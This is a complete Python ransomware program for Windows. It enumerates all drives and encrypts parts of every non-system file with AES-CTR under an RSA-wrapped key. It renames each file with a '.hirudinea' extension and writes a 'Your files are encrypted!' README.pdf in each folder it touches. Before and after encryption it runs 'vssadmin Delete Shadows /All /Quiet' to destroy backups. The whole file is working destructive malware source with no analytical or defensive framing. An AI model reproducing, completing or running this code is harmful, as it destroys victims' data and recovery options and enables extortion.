import os
import string
import subprocess
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from fpdf import FPDF

# Listing all drives on a Windows system by letter from Z to A
drives = [f"{drive}:\\" for drive in string.ascii_uppercase[::-1] if os.path.exists(f"{drive}:\\")]

# Public RSA key, replace this with your actual public key string
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7v6l5V5COQA1QbkxFdNe
5C7IJYZlUICSI+uBqqpZlBkDTPt4VsskyHdr9mBrZ7yloLjywl3S6kDb52LkEDrr
k3pZUhGXzICP9C7kJJnEyhG8I70DvtjEzI1fYG6Zrh3zxq6XeGJhCc6jWh1+bkip
MMFZKBqKf8ALM8g5pVWxz5vdYgHH3CSR1xFep7tjSV1QFhptL9tuFT+hOZCgfY+/ 
3FzD7FnklJSQpX3WzOQBtvLkC3P/VCkYVt8P8DR4DldR4YVgeNAg8P1m5IYdYxP2
X8aip56m0J4b+5ySI9zWOMC6F6lBfKyzQu5FcRVVeldBaiKpnvHH5BvLdK3h7Giw
IDAQAB
-----END PUBLIC KEY-----"""

# Load RSA public key
rsa_key = RSA.importKey(public_key)
rsa_cipher = PKCS1_OAEP.new(rsa_key)

# Create an AES CRT cipher with a random key and IV
key = get_random_bytes(16)  # AES key must be either 16, 24, or 32 bytes long
iv = get_random_bytes(16)  # IV must be 16 bytes long for AES
cipher = AES.new(key, AES.MODE_CTR, nonce=b'', initial_value=iv)

# Encrypt the key and IV with RSA
encrypted_key = rsa_cipher.encrypt(key)
encrypted_iv = rsa_cipher.encrypt(iv)

# Ignored directories
ignored_dirs = {
    "$Recycle.Bin", "Boot", "Documents and Settings", "PerfLogs", "Program Files", 
    "Program Files (x86)", "ProgramData", "Recovery", "System Volume Information", 
    "Windows", "$RECYCLE.BIN"
}

# Ignored file extensions
ignored_extensions = {
    ".bat", ".bin", ".cab", ".cd", ".com", ".cur", ".dagaba", ".diagcfg", ".diagpkg",
    ".drv", ".dll", ".exe", ".hlp", ".hta", ".ico", ".lnk", ".msi", ".ocx", ".ps1", 
    ".psm1", ".scr", ".sys", ".ini", "Thumbs.db", ".url", ".iso"
}

def delete_shadow_copies():
    # Delete system shadow copies
    command = "vssadmin Delete Shadows /All /Quiet"
    subprocess.run(command, shell=True)

def encrypt_sections(file_path):
    try:
        with open(file_path, "rb+") as file:
            file_content = file.read()
            file_size = len(file_content)
            section_size = 1024 * 1024  # 1MB

            # Determine how many sections to create based on file size
            if file_size <= 2 * section_size:
                num_sections = 1
            elif file_size <= 3 * section_size:
                num_sections = 2
            elif file_size > 4 * section_size:
                num_sections = 4
            else:
                num_sections = 1

            # Encrypt and overwrite the first 1MB of each section
            for section in range(num_sections):
                start = section * file_size // num_sections
                end = start + section_size
                part_to_encrypt = file_content[start:min(end, file_size)]
                encrypted_part = cipher.encrypt(part_to_encrypt)

                # Move the file pointer and overwrite the encrypted part
                file.seek(start)
                file.write(encrypted_part)

        # Append the encrypted key and IV to the end of the file
        with open(file_path, "ab") as file:
            file.write(encrypted_key)
            file.write(encrypted_iv)

        # Rename the file to add the ".hirudinea" extension
        os.rename(file_path, file_path + ".hirudinea")
        print(f"Encrypted and renamed {file_path}")

    except PermissionError:
        print(f"Permission denied for {file_path}")
        return

def create_readme(directory):
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    pdf.cell(200, 10, txt="Your files are encrypted!", ln=True, align='C')
    pdf.output(os.path.join(directory, "README.pdf"))

# Initial deletion of shadow copies
delete_shadow_copies()

# Explore each drive and encrypt files
for drive in drives:
    for root, dirs, files in os.walk(drive):
        # Skip ignored directories
        if any(dir_name in root for dir_name in ignored_dirs):
            continue
        # Encrypt files that are not ignored by extension
        for file in files:
            if not any(file.endswith(ext) for ext in ignored_extensions):
                file_path = os.path.join(root, file)
                encrypt_sections(file_path)
        # If there are files processed, create a README
        if files:
            create_readme(root)

# Final deletion of shadow copies after encryption
delete_shadow_copies()

print("Encrypted key:", encrypted_key.hex())
print("Encrypted IV:", encrypted_iv.hex())

